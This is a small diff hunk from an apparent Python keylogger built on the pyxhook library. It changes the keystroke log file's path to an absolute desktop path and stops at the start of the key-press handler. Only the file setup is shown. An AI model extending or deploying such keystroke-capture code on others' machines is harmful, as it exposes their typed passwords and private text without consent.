@@ -13,7 +13,7 @@ grave key is found below Esc key
 
 import pyxhook
 #change this to your log file's path
-log_file='~/Desktop/file.log'
+log_file='/home/aman/Desktop/file.log'
 
 #this function is called everytime a key is pressed.
 def OnKeyPress(event):
